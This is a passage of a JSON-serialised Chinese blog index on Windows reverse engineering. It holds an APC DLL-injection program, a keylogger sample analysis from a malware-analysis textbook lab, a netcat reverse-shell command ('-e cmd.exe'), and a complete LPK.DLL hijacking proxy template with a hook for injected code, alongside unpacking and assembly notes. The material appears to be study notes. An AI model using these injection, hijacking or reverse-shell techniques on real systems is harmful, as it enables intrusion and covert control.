QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData);\n\t\t\t\t\t}\n\t\t\t\t\tif (dwRet > 0)\n\t\t\t\t\t{\n\t\t\t\t\t\tbstat = TRUE;\n\t\t\t\t\t}\n\t\t\t\t\tCloseHandle(handleThread);\n\t\t\t\t}\n\t\t\t} while (Thread32Next(handleSnap, &te));\n\t\t\tCloseHandle(handleSnap);\n\t\t\treturn bstat;\n\t\t}\n\t\n\t\t}\n\t\tint main()\n\t\t{\n\t\t\tInjection_APC(L\"testapc.exe\", L\"testapcdll.dll\");\n\t\t\treturn 0;\n\t\t}\n\n测试exe程序：\n\n\t\t#include<windows.h>\n\t\tint main()\n\t\t{\n\t\t\tMessageBox(NULL, L\"start\", L\"tit\", MB_OK);\n\t\t\tSleepEx(1000 * 60 * 5, true);\n\t\t\tMessageBox(NULL, L\"end\", L\"tit\", MB_OK);\n\t\t\tSleep(-1);\n\t\t}\n\n\n测试dll 程序：\u000b\n\n\t#include<windows.h>\n\t#include\"dll.h\"\n\tBOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved)\n\t{\n\t\tswitch (dwReason)\n\t\t{\n\t\t\t// 动态链接库映射到某个进程的地址空间\n\t\tcase DLL_PROCESS_ATTACH:\n\t\t\tMessageBox(NULL, L\"in apc ok~\", L\"tit\", MB_OK);\n\t\t\t/**\n\t\t\t* 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作，\n\t\t\t* 如果初始化失败可以返回 false 这样DLL就不会被继续加载了\n\t\t\t**/\n\t\t\tbreak;\n\t\n\t\t\t// 应用程序创建新的线程\n\t\tcase DLL_THREAD_ATTACH:\n\t\n\t\t\tbreak;\n\t\n\t\t\t// 应用程序某个线程正常终止\n\t\tcase DLL_THREAD_DETACH:\n\t\n\t\t\tbreak;\n\t\n\t\t\t// 动态链接库将被卸载\n\t\tcase DLL_PROCESS_DETACH:\n\t\t\t/**\n\t\t\t* 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作\n\t\t\t* 如关闭文件，释放内存空间等\n\t\t\t**/\n\t\t\tbreak;\n\t\t}\n\t\treturn 1;\n\t}\n\t/*\n\tvoid helloDLL(void)\n\t{\n\t//MessageBox(NULL, TEXT(\"Hello DLL~\"), TEXT(\"Title\"), MB_OK);\n\t}*/","tags":["逆向"],"categories":["逆向"]},{"title":"VS错误集","url":"/2017/09/14/vs错误集/","content":"\n一 .无法解析的外部符号 _main，该符号在函数 \"int __cdecl invoke_main(void)\" (?invoke_main@@YAHXZ) 中被引用window\tF:\\c\\window\\window\\MSVCRTD.lib(exe_main.obj)\t\n\n&emsp;&emsp;原因是c语言程序找不到适当的入口程序函数\t\n般情况下，\n\n&emsp;&emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目”\n\n&emsp;&emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求\n\n&emsp;&emsp;如果是windows程序：\n\n* 1.菜单中选择 工程->属性, 弹出属性窗口\n\n* 2.在左边栏中依次选择：配置属性->C/C++->预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS.\n\n* 3.在左边栏中依次选择：配置属性->链接器->系统,然后在右边栏的SubSystem对应的项改为Windows(/SUBSYSTEM:WINDOWS)\n如果是控制台程序：\n\n* 1.菜单中选择 工程->属性, 弹出弹出属性窗口\n* 2.在左边栏中依次选择：配置属性->C/C++->预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE.\n* 3.在左边栏中依次选择：配置属性->链接器->系统,然后在右边栏的SubSystem对应的项改为CONSOLE(/SUBSYSTEM:CONSOLE)\n\n二  vs2015丢失msvcp140.dll 无法运行程序\n\n1.可以选择静态编译\n\n![](https://i.imgur.com/hetjIa8.png)\n\n初始状态是这样的\n\n![](https://i.imgur.com/pXqN4Tq.png)\n\n2.安装vs2015运行库。\n\n","tags":["编程"],"categories":["编程"]},{"title":"sublime中文乱码处理","url":"/2017/09/13/sublime乱码处理/","content":"\n\n一、安装包管理器\n使用Ctrl+~快捷键或者通过View->Show Console菜单打开命令行，粘贴如下代码\n\n\t\n\timport urllib.request,os; pf = 'Package Control.sublime-package'; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), 'wb').write(urllib.request.urlopen( 'http://sublime.wbond.net/' + pf.replace(' ',' ')).read())\n\n\n顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了\n\n\n二、安装乱码处理插件：\n\n    调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；\n","tags":["杂学"],"categories":["杂学"]},{"title":"shellcode 实现键盘记录样本分析","url":"/2017/09/11/shellcode 实现键盘记录样本分析/","content":"\n1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.\n2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到\n\n\t\t\tC:\\WINDOWS\\System32\\inet_epar32.dll\n\t\t\tzzz69806582\n\t\t\tnet start cisvc\n\t\t\tC:\\WINDOWS\\System32\\%s\n\t\t\tcisvc.exe\n\t\t\tLab11-03.dll\n\n等字符串，C:\\WINDOWS\\System32\\inet_epar32.dll表示程序可能加载该dll,net start cisvc是服务的启动方式，cisvc.exe代表该程序可能被启动。然后对Lab11-03.dll进行分析，出现了\n\n\t\tC:\\WINDOWS\\System32\\kernel64x.dll\n\t\tzzz69806582\n\t\tGetForegroundWindow\n\t\tGetAsyncKeyState\n等，C:\\WINDOWS\\System32\\kernel64x.dll表示程序可能加载该dll，zzz69806582暂时还看不出来有什作用，GetForegroundWindow，GetAsyncKeyState表示这很可能是一个键盘记录器。\n3.然后进行动态分析，命令行切到当前目录下，运行Lab11-03.exe，用procmon和procexp进行监控，\n\n![](https://i.imgur.com/7WpA6fl.png)\n\n如图可以看到该样本启动了一个服务。至于启动什么服务，通过procmon来具体看。\n在进程栏看到了net start cisvc\n\n![](https://i.imgur.com/z1cNgvE.png)\n\n在文件操作一栏我们可以看到创建并写入了文件inet_epar32.dll,打开了cisvc.exe\n但是并没有写入文件的操作。\n\n![](https://i.imgur.com/zKoDTRC.png)\n\n在注册表一栏并没有看到什么信息。此时我们更换过滤条件，查看一下cisvc.exe进行了哪些操作。可以看到加载inet_epar32.dll，在系统文件夹中创建了kernel64x.dll文件，并写入了一些内容猜测是键盘记录的内容。\n\n![](https://i.imgur.com/8gZK3jo.png)\n\n4.下面进行静态高级分析。把Lab11-03.exe和Lab11-03.dll分别载入ida进行分析。\n代码反编译为c可以看到很简单。\n\n![](https://i.imgur.com/bE6edAP.png)\n\n首先是把Lab11-03.dll复制为C:\\WINDOWS\\System32\\inet_epar32.dll，然后sub_401070函数时对cisvc.exe的操作，看到是对cisvc.exe进行文件映射然后byte_409030位置的314个字节的内容写到cisvc.exe的开始位置，很显示cisvc.exe插入了一段shellcode,下面查看这段shellcode,在409030位置可以看到是原始字节内容，按c可以反汇编为汇编代码，如图\n\n![](https://i.imgur.com/LILvS7S.png)\n![](https://i.imgur.com/UQhv1WM.png)\n\n如图是shellcode 代码，在sehcode 末尾是一些字符串，按a可以显示完整字符串，猜测此shellc是加载该dll,后面的字符串仍然不知道是什么。\n\n![](https://i.imgur.com/xjBjblH.png)\n\n此时我们用ida加载inet_epart32.dll也即是Lab11-03.dll，在导出函数中我们可以看到是以上的未知字符串刚好是其的导出函数，分析该函数看到仅仅只是创建了一个线程，分析该线程，可以看到此线程是实现键盘记录的，其记录保存在C:\\WINDOWS\\System32\\kernel64x.dll中。\n\n下面对cisvc.exe进行分析。分析插入shellcode前后的变化。首先用PE view查看pe头的变化。可以看到入口位置发生了变化。\n\n![](https://i.imgur.com/JjL5XdL.png)\n\n分别用ida载入，可以看到插入shellcode的cisvc.exe入口点直接就是shellcode代码，在od中载入，然后单步运行观察shellcode的功能。\n\n![](https://i.imgur.com/4NzLH89.png)\n\n如图1001b0a位置是加载C:\\WINDOWS\\System32\\inet_epar32.dll的位置，下面是获取\nzzz69806582函数地址。到此整个流程就分析完了。\n\nLab11-03.exe把Lab11-03.dll复制为C:\\WINDOWS\\System32\\inet_epar32.dll，启动cisvc服务，然后再cisvc.exe中插入一段shellcode，来实现键盘记录，记录保存在C:\\WINDOWS\\System32\\kernel64x.dll。打开notepad随便输入进行测试，然后用flexhex打开C:\\WINDOWS\\System32\\kernel64x.dll，可以看到记录了notepad和输入的内容。\n![](https://i.imgur.com/D2eC7AJ.png)","tags":["逆向"],"categories":["逆向"]},{"title":"常规脱壳","url":"/2017/08/09/常规脱壳/","content":"\n\n总结方法如下：\n\n1、单步跟（向上的跳转下一步F4）\n\n2、esp定律\n\n3、二次内存镜像\n\n4、一次到位\n\n5、模拟跟踪\n\n   > tc eip<sfx\n   > \n   > 调试 sfx  第二个\n\n6、最后一次异常\n\n7、特殊方法\n\nat GetVersion等\n\n8、注意事项\n当用OD插件脱壳后不能运行时，可以用loadpe修正镜像大小，然后再重建输入表，再看是否成功，不行的话，手动找一找IAT的起始位置和结束为止，看Import REC 的RVA和大小是否一致，如果还不行就用load pe重建PE\n\n\n9、常用语言的入口特征：\n\n\nVB：\n\t\n\t004012D4 >  68 54474000     push QQ个性网.00404754\n\t004012D9    E8 F0FFFFFF     call <jmp.&MSVBVM60.#100>\n\t004012DE    0000            add byte ptr ds:[eax],al\n\t004012E0    0000            add byte ptr ds:[eax],al\n\t004012E2    0000            add byte ptr ds:[eax],al\n\t004012E4    3000            xor byte ptr ds:[eax],al\n\t004012E6    0000            add byte ptr ds:[eax],al\n\t004012E8    48              dec eax\n\n\n\ndelphi:\n\t\n\t004A5C54 >  55              push ebp\n\t004A5C55    8BEC            mov ebp,esp\n\t004A5C57    83C4 F0         add esp,-10\n\t004A5C5A    B8 EC594A00     mov eax,openpro.004A59EC\n\nBC++:\n\n\t00401678 > /EB 10           jmp short btengine.0040168A\n\t0040167A   |66:623A         bound di,dword ptr ds:[edx]\n\t0040167D   |43              inc ebx\n\t0040167E   |2B2B            sub ebp,dword ptr ds:[ebx]\n\t00401680   |48              dec eax\n\t00401681   |4F              dec edi\n\t00401682   |4F              dec edi\n\t00401683   |4B              dec ebx\n\t00401684   |90              nop\n\t00401685  -|E9 98005400     jmp 00941722\n\t0040168A   \\A1 8B005400     mov eax,dword ptr ds:[54008B]\n\t0040168F    C1E0 02         shl eax,2\n\t00401692    A3 8F005400     mov dword ptr ds:[54008F],eax\n\t00401697    52              push edx\n\t00401698    6A 00           push 0\n\t0040169A    E8 99D01300     call <jmp.&KERNEL32.GetModuleHandleA>\n\t0040169F    8BD0            mov edx,eax\n\n\n\nVC++:\n\n\t0040A41E >  55              push ebp\n\t0040A41F    8BEC            mov ebp,esp\n\t0040A421    6A FF           push -1\n\t0040A423    68 C8CB4000     push 跑跑排行.0040CBC8\n\t0040A428    68 A4A54000     push <jmp.&MSVCRT._except_handler3>\n\t0040A42D    64:A1 00000000  mov eax,dword ptr fs:[0]\n\t0040A433    50              push eax\n\t0040A434    64:8925 0000000>mov dword ptr fs:[0],esp\n\t0040A43B    83EC 68         sub esp,68\n\t0040A43E    53              push ebx\n\t0040A43F    56              push esi\n\t0040A440    57              push edi\n\n\n\nMASM(汇编):\n\n\t004035C9 >  6A 00           push 0\n\t004035CB    E8 A20A0000     call <jmp.&kernel32.GetModuleHandleA>\n\t004035D0    A3 5B704000     mov dword ptr ds:[40705B],eax\n\t004035D5    68 80000000     push 80\n\t004035DA    68 2C754000     push 11.0040752C\n\t004035DF    FF35 5B704000   push dword ptr ds:[40705B]\n\t004035E5    E8 820A0000     call <jmp.&kernel32.GetModuleFileNameA>\n\t004035EA    E8 87070000     call 11.00403D76\n\t004035EF    6A 00           push 0\n\t004035F1    68 0B364000     push 11.0040360B\n\t004035F6    6A 00           push 0\n\t004035F8    6A 64           push 64\n\t004035FA    FF35 5B704000   push dword ptr ds:[40705B]\n","tags":["逆向"],"categories":["逆向"]},{"title":"netcat-反向shell","url":"/2017/08/06/netcat—反向shell/","content":"\n利用在网络工具中有“瑞士军刀”美誉的NetCat实现反向shell\n\n1.windows端下载netcat程序，加入环境变量，cmd执行nc命令    nc.exe  ip  端口   -e cmd.exe\n\n2.linux 主机执行 nc  -l  -p 80\n\n3.在windows主机上就建立了一个反向 的shell,在linux主机上就可以直接操作了。","tags":["逆向"],"categories":["逆向"]},{"title":"数据隐藏-ADS","url":"/2017/08/06/数据隐藏-ADS/","content":"\n\nNTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。某些病毒利用NTFS数据流来隐藏，此类病毒我们称之为ADS流病毒或ZeroAcess。\n\n详见[ADS](https://baike.baidu.com/item/ADS%E6%B5%81%E6%96%87%E4%BB%B6/3995128?fr=aladdin)\n","tags":["逆向"],"categories":["逆向"]},{"title":"汇编知识学习","url":"/2017/08/06/汇编知识学习/","content":"\n1.MOVSX  带符号扩展指令\n\n\tMOV BL,80H   \n\tMOVSX  AX,BL\n\tAX=0FF80H\n\t因为带符号扩展的时候，高位视为符号位，扩展的高位全置1\n\n2.neg eax  sbb eax ,eax\n\n\t例如 \n\tneg r\n\tsbb r-r\n\tneg eax 就是0-eax 其实际上就是设置标志位 cf=1 \n\tsbb eax,eax 就是eax-eax-cf\n\t如果r=0; cf=0 ;最后结果就是把r 设为0，如果r不等于0，则cf=1\n\t相当于r-r-cf=-1=oxffffffff\n\t注意：\n\t MOVzX  无符号扩展指令\n\n\n3.test 指令\n\n\ttest eax,eax 基本上和 And eax,eax 是一样的，不同的是test 不改变eax的结果，只是改变FLAG寄存器的状态，也就是改变进位标志，零标志，溢出标志等 等。举一个例子，如果eax=01h,test eax,eax 就是两个01h 作与操作，所以结果还是01h,不是0的话，就不会跳转 je  xxxx。所以要跳转je xxxx,只有一种可能就是eax=0h.所以现在eax=0x01 则不会跳转 je  xxxx\n\n4.__alloca_probe\n\n\t逆向vc编译的程序，经常会看到这样的代码出现在函数头部：\n\t\n\tmov     eax, xxxxh\n\tcall    __alloca_probe\n\t\n\txxxxh是个立即数，一般大于1000h,即十进制数4096。\n\t\n\t这段代码经常出现在函数头prolog之后，如果有异常结构，会出现在SEH或EH之后。\n\t\n\t示例1：\n\t                 push    ebp\n\t                 mov     ebp, esp\n\t                 mov     eax, 8080h\n\t                 call    __alloca_probe\n\t                 \n\t示例2：\n\t                 push    ebp\n\t                 mov     ebp, esp\n\t                 and     esp, 0FFFFFFF8h\n\t                 push    0FFFFFFFFh\n\t                 push    offset SEH_4A7AA0\n\t                 mov     eax, large fs:0\n\t                 push    eax\n\t                 mov     large fs:0, esp\n\t                 push    ecx\n\t                 mov     eax, 8080h\n\t                 call    __alloca_probe\n\t                 \n\t事实上__alloca_probe是一个在stack上分配大块内存空间函数，功能同SUB ESP, xxxxh一致。函数本身由编译器提供，编译的时候vc会根据实际情况（stack上申请大块空间，一般大于一个内存页大小）插入到函数体，为函数在stack上提供私有变量空间，分配的空间大小由fastcall调用方式的EAX寄存器传入。\n\n5.chkstk函数\n\n\t分配较大局部变量空间时chkstk函数来检测是否超过堆栈上已经分配的空间\n\t\n\t\n\t我的理解就是ecx保存未调用此函数前esp的值，随后每次减去一页的空间也就是1000h,\n\teax保存的就是所有要分配的空间，每次分配一页之后也减去1000h,然后比较eax和1000h的值，看是否还需要一页，如果大于1000h,继续循环。否则用ecx减去eax得到最终分配的空间栈顶位置，然后把ecx的值赋给esp,跳回函数的返回地址，结束分配。\n\n6.JGE.JLE,JNE,JE跳转条件\n\n\tJGE 大于等于跳转，JLE小于等于跳转，JNE不等于跳转，JE 前等于后跳转\n\n7.字符串入栈的操作：\n\n\tvoid main(){\n\t01361000  push        ebp  \n\t01361001  mov         ebp,esp  \n\t01361003  sub         esp,0Ch    //栈顶抬高12个字节\n\t01361006  mov         eax,dword ptr [___security_cookie (1363000h)]  \n\t0136100B  xor         eax,ebp  \n\t0136100D  mov         dword ptr [ebp-4],eax    //用了4个字节\n\t  int intA;\n\t  char ch[5]=\"abcd\";\n\t01361010  mov         eax,dword ptr [string \"abcd\" (136210Ch)] \n\t01361015  mov         cl,byte ptr ds:[1362110h]    //两句传送字符串”abcd\\0”到寄存器\n\t  intA=15;\n\t  fun(intA,ch);\n\t0136101B  lea         edx,[ebp-0Ch] //\n\t0136101E  push        edx    //数组地址,ch[]\n\t0136101F  push        0Fh    //立即数参数,15\n\t01361021  push        offset string \"Integer:%d String:%s\" (13620F4h)  \n\t01361026  mov         dword ptr [ebp-0Ch],eax  \n\t01361029  mov         byte ptr [ebp-8],cl    //两句语句表示”abcd\\0”写入栈中\n\t0136102C  call        dword ptr [__imp__printf (13620A0h)]  //调用printf\n\t}\n\tcl 这个赋值一直不太懂，后来知道了字符串要以00结尾才行，所以要再赋值cl为00，然后放在abcd的后面。\n\n8.atoi 函数 \n \n\t字符串转变为数字\n","tags":["编程"],"categories":["编程"]},{"title":"进程替换的一种方式","url":"/2017/08/06/进程替换的一种检测方式/","content":"\n进程替换问题\n\nsvchost.exe 经常被替换，鉴定的一种方式是通过process explorer 查看磁盘和内存中的字符串是否一致来判断。\n\n![](http://i.imgur.com/3u192lY.png)\n\n","tags":["逆向"],"categories":["逆向"]},{"title":"dll加载和劫持","url":"/2017/08/03/dll加载和劫持/","content":"\n一.dll加载顺序\n\n1. DLL查找路径基础\n\n&emsp;&emsp;应用程序可以通过以下方式控制一个DLL的加载路径：使用全路径加载、使用DLL重定向、使用manifest文件。如果上述三种方式均未指定，系统查找DLL的顺序将按照本部分描述的顺序进行。\n\n&emsp;&emsp;对于以下两种情况的DLL，系统将不会查找，而是直接加载：\n\n&emsp;&emsp;a. 对于已经加载到内存中的同名DLL，系统使用已经加载的DLL，并且忽略待加载DLL的路径。（注意对某个进程而言，系统已经加载的DLL一定是唯一的存在于某个目录下。）\n\n&emsp;&emsp;b. 如果该DLL存在于某个Windows版本的已知DLL列表（unkown DLL）中，系统使用已知DLL的拷贝（包括已知DLL的依赖项）。已知DLL列表可以从如下注册表项看到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs。\n\n&emsp;&emsp;这里有个比较坑的地方，对于有依赖项的DLL（即使使用全路径指定DLL位置），系统查找其所依赖DLL的方法是按照实际的模块名称来的，因此如果加载的DLL不在系统查找顺序目录下，那么动态加载该DLL（LoadLibrary）会返回一个\"找不到模块\"的错误。\n\n\n2.系统标准DLL查找顺序\n\n&emsp;&emsp;系统使用的标准DLL查找顺序依赖于是否设置了\"安全DLL查找模式\"（safe DLL search mode）。\"安全DLL查找模式\"会将用户当前目录置于查找顺序的后边。\n\"安全DLL查找模式\"默认是启用的，禁用的话，可以将注册表项HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode设为0。调用SetDllDirectory函数可以禁用\"安全DLL查找模式\"，并修改DLL查找顺序。\nWindows XP下，\"安全DLL查找模式\"默认是禁用的，需要启用该项的话，在注册表中新建一个SafeDllSearchMode子项，并赋值为1即可。\"安全DLL查找模式\"从Windows XP SP2开始，默认是启用的。\n\n\n&emsp;&emsp;启用\"安全DLL查找模式\"时，查找顺序如下：\n\n* a . 应用程序所在目录；\n*\nb. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；\nc. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；\nd. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；\ne. 当前目录。GetCurrentDirectory返回的目录；\nf. 环境变量PATH中所有目录。\n\n如果\"安全DLL查找模式\"被禁用，查找顺序如下：\na. 应用程序所在目录；\nb. 当前目录。GetCurrentDirectory返回的目录；\nc. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；\nd. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；\ne. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；\nf. 环境变量PATH中所有目录。\n\n3. 修改系统DLL查找顺序\n系统使用的标准DLL查找顺序可以通过以下两种方式调整：\n3.1 使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数；\n这种方式调用LoadLibraryEx函数，需要设置lpFileName参数（绝对路径）。与标准查找策略不同的是，使用LOAD_WITH_ALTERED_SEARCH_PATH标志调用LoadLibraryEx函数的DLL查找顺序将\"查找应用程序所在目录\"修改为lpFileName指定的目录。\n3.2 调用SetDllDirectory函数。\n注意：SetDllDirectory函数在Windows XP SP1开始支持的。\n函数SetDllDirectory在调用参数lpPathName是一个路径时，可支持修改DLL搜索路径。修改之后的搜索顺序如下：\na. 应用程序所在目录；\nb. 函数SetDllDirectory参数lpPathName给定的目录；\nc. 系统目录。GetSystemDirectory返回的目录，通常是系统盘\\Windows\\System32；\nd. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；\ne. Windows目录。GetWindowsDirectory返回的目录，通常是系统盘\\Windows；\nf. 环境变量PATH中所有目录。\n如果lpPathName参数为空字符串，这样就会把当前目录从DLL搜索路径中去掉。\n如果用NULL参数调用SetDllDirectory函数，可以恢复按照系统注册表的\"安全DLL查找模式\"来查找DLL。\n\n当然win8或者windows server 2012提供更多的可定制方法，这个可以参考MSDN上介绍。比如：SetDefaultDllDirectories、 AddDllDirectory、RemoveDllDirectory。\n\n4.为了测试计算机系统的dll 加载顺序可以通过一个程序加载一个不存在的dll,然后用process monitor 来监控加载的行为。\n\t\n\t#include <windows.h>\n\t#include <iostream>\n\t\n\tint main(int argc, char ** argv)\n\t{\n\t    using std::cout;\n\t    using std::endl;\n\t    \n\t    // 随便设置一个不存在的dll名\n\t    HMODULE hMod = LoadLibrary(\"123.dll\");\n\t\n\t    if (NULL != hMod)\n\t        FreeLibrary(hMod);\n\t        \n\t    cout << \"LoadLibrary Test\" << endl;\n\t    \n\t    return 0;\n\t}\n5.通过process monitor 实际测试win10 64位发现加载顺序是\n\t•  应用程序所在目录\n\t• 系统目录（首先是c:\\Windows\\SysWOW64；然后是c:\\Windows\\System）\n\t• windows目录\n\t• 当前目录\n\t• 环境变量path目录\n\n二  dll 劫持\n\n&emsp;&emsp;由于输入表中只包含DLL名而没有它的路径名，因此加载程序必须在磁盘上搜索DLL文件。首先会尝试从当前程序所在的目录加载DLL，如果没找到，则在Windows系统目录中查找，最后是在环境变量中列出的各个目录下查找。利用这个特点，先伪造一个系统同名的DLL，提供同样的输出表，每个输出函数转向真正的系统DLL。程序调用系统DLL时会先调用当前目录下伪造的DLL，完成相关功能后，再跳到系统DLL同名函数里执行。这个过程用个形象的词来描述就是系统DLL被劫持（hijack）了。\n\n&emsp;&emsp;●DLL劫持的实现●\n这一步我们的工作就是通过编程来实现一个LPK.DLL文件，它与系统目录下的LPK.DLL导出表相同，并能加载系统目录下的LPK.DLL，并且能将导出表转发到真实的LPK.DLL。可以看出我们要实现的这个DLL需求如下：\n\n* 1 、构造一个与系统目录下LPK.DLL一样的导出表；\n\n* 2、加载系统目录下的LPK.DLL；\n\n* 3、将导出函数转发到系统目录下的LPK.DLL上；\n\n* 4、在初始化函数中加入我们要执行的代码。\n\n我们使用VC++来进行开发，首先是定义导出函数。核心代码如下：\n\n\n\t#pragma comment(linker, \"/EXPORT:LpkInitialize=_gamehacker_LpkInitialize,@1\")\n\t#pragma comment(linker, \"/EXPORT:LpkTabbedTextOut=_gamehacker_LpkTabbedTextOut,@2\")\n\t#pragma comment(linker, \"/EXPORT:LpkDllInitialize=_gamehacker_LpkDllInitialize,@3\")\n\t#pragma comment(linker, \"/EXPORT:LpkDrawTextEx=_gamehacker_LpkDrawTextEx,@4\")\n\t#pragma comment(linker, \"/EXPORT:LpkExtTextOut=_gamehacker_LpkExtTextOut,@6\")\n\t#pragma comment(linker, \"/EXPORT:LpkGetCharacterPlacement=\n\t_gamehacker_LpkGetCharacterPlacement,@7\")\n\t#pragma comment(linker, \"/EXPORT:LpkGetTextExtentExPoint=_gamehacker_LpkGetTextExtentExPoint,@8\")\n\t#pragma comment(linker, \"/EXPORT:LpkPSMTextOut=_gamehacker_LpkPSMTextOut,@9\")\n\t#pragma comment(linker, \"/EXPORT:LpkUseGDIWidthCache=_gamehacker_LpkUseGDIWidthCache,@10\")\n\t#pragma comment(linker, \"/EXPORT:ftsWordBreak=_gamehacker_ftsWordBreak,@11\")\n\n以上是导出表中的函数，LPK.DLL比较特殊，在导入表中有一项不是函数是数据，因此数据这部分要单独处理。核心代码如下：\n\n\t★\n\tEXTERNC void __cdecl gamehacker_LpkEditControl(void);   \n\tEXTERNC __declspec(dllexport) void (*LpkEditControl[14])() = {gamehacker_LpkEditControl};  \n\t★\nLpkEditControl这个数组有14个成员，如上定义即可，后面我们还需要将真正的数据复制过来。\n加载系统目录下的LPK.DLL。核心代码如下：\n\t★\n\t inline BOOL WINAPI Load()\n\t {\n\t  TCHAR tzPath[MAX_PATH];\n\t  TCHAR tzTemp[MAX_PATH * 2];\n\t  \n\t  GetSystemDirectory(tzPath, MAX_PATH);\n\t  lstrcat(tzPath, TEXT(\"\\\\lpk\"));\n\t  m_hModule=LoadLibrary(tzPath);  \n\t  return (m_hModule != NULL); \n\t }\n\t★\n在代码中可以看到，使用LoadLibrary方式加载系统目录下的LPK.DLL。加载完成后就要实现导出函数的转发了，这步是很关键的。\n首先要获得原函数地址。核心代码如下：\n\n\t★\n\t FARPROC WINAPI GetAddress(PCSTR pszProcName)\n\t {\n\t  FARPROC fpAddress;\n\t  CHAR szProcName[16];\n\t  TCHAR tzTemp[MAX_PATH];\n\t  \n\t  fpAddress = GetProcAddress(m_hModule, pszProcName);  \n\t  return fpAddress;\n\t }\n\t★\n\n然后将我们构造的导出函数一一转发。核心代码如下：\n\n\t★\n\tALCDECL gamehacker_LpkInitialize(void)\n\t{\n\t GetAddress(\"LpkInitialize\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkTabbedTextOut(void)\n\t{\n\t GetAddress(\"LpkTabbedTextOut\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkDllInitialize(void)\n\t{\n\t GetAddress(\"LpkDllInitialize\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkDrawTextEx(void)\n\t{\n\t GetAddress(\"LpkDrawTextEx\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkEditControl(void)\n\t{\n\t GetAddress(\"LpkEditControl\");\n\t __asm jmp DWORD ptr [EAX];\n\t}\n\tALCDECL gamehacker_LpkExtTextOut(void)\n\t{\n\t GetAddress(\"LpkExtTextOut\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkGetCharacterPlacement(void)\n\t{\n\t GetAddress(\"LpkGetCharacterPlacement\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkGetTextExtentExPoint(void)\n\t{\n\t GetAddress(\"LpkGetTextExtentExPoint\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkPSMTextOut(void)\n\t{\n\t GetAddress(\"LpkPSMTextOut\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_LpkUseGDIWidthCache(void)\n\t{\n\t GetAddress(\"LpkUseGDIWidthCache\");\n\t __asm JMP EAX;\n\t}\n\tALCDECL gamehacker_ftsWordBreak(void)\n\t{\n\t GetAddress(\"ftsWordBreak\");\n\t __asm JMP EAX;\n\t}\n\t★\n转发完之后不要忘记LpkEditControl哦，要将真实数据复制过来。核心代码如下：\n★\n memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(\"LpkEditControl\") + 1),52);  \n★\n好了，到这里整个DLL劫持基本就算完成了，也许你要问，那我们要执行的代码写在哪里？我的方法是将其写到初始化函数中。这样当DLL被加载的时候就会执行。下面看一下DLL的入口函数吧。\n\n\t★\n\tBOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)\n\t{\n\t if (dwReason == DLL_PROCESS_ATTACH)\n\t {\n\t  DisableThreadLibraryCalls(hModule);\n\t  if(Load())\n\t  {  \n\t   memcpy((LPVOID)(LpkEditControl+1), (LPVOID)((int*)GetAddress(\"LpkEditControl\") + 1),52);  \n\t   _beginthread(Init,NULL,NULL);\n\t  }\n\t  else\n\t   return FALSE;\n\t }\n\t else if (dwReason == DLL_PROCESS_DETACH)\n\t {\n\t  Free();\n\t }\n\t return TRUE;\n\t}\n\t★\n\n在这个函数中我们看到，当加载系统目录下的LPK.DLL成功后，进行了LpkEditControl数组的复制，并通过_beginthread(Init,NULL,NULL);定义了初始化函数Init，而这个初始化函数是由我们控制的。\n下面在初始化函数Init中写入测试代码如下：\n\n\t★\n\tvoid WINAPIV Init(LPVOID pParam);\n\tvoid WINAPIV Init(LPVOID pParam)\n\t{\n\t TCHAR tzPath[MAX_PATH];\n\t TCHAR tzTemp[MAX_PATH * 2];\n\t  wsprintf(tzTemp, TEXT(\"劫持函数运行了.......\"), tzPath);\n\t   MessageBox(NULL, tzTemp, TEXT(\"gamehacker\"), MB_ICONSTOP);\n\t return; \n\t} \n\t★\n","tags":["逆向"],"categories":["逆向"]},{"title":"一个简单的crackme","url":"/2017/08/01/一个简单的crackme/","content":"\n\n一、样本基本信息\n\n程序链接    